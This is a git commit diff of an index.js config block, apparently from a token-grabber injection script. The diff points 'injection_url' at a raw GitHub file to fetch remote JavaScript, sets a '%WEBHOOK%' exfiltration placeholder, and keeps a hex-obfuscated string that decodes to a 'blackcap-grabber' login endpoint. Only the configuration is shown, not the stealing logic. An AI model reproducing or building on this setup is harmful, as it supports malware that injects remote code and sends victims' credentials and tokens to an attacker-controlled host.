17fd9e50259bb36ffa8528cb2f35ad06a1184d75
xugga <147700782+xugga@users.noreply.github.com>
2023-12-27 22:02:43 +0200

    index.js

--- index.js
+++ index.js
@@ -15,8 +15,8 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "ds",
-    webhook: "https://raw.githubusercontent.com/xugga/hsgsfhsghsg/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/xugga/hsgsfhsghsg/main/index.js",
+    webhook: "%WEBHOOK%",
     uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
         "urls": [
